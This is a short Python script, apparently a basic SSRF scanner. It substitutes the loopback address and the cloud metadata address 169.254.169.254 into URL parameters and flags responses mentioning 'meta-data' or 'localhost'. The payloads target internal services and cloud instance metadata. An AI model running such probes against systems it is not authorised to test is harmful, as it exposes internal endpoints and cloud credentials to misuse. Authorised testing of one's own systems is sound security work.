import requests

payloads = [
    "http://127.0.0.1",
    "http://169.254.169.254"
]

def scan(url):
    results = []

    for payload in payloads:
        test_url = url.replace("=", f"={payload}")

        try:
            r = requests.get(test_url, timeout=5)

            if "meta-data" in r.text or "localhost" in r.text:
                results.append({
                    "type": "SSRF",
                    "url": test_url
                })

        except:
            pass

    return results
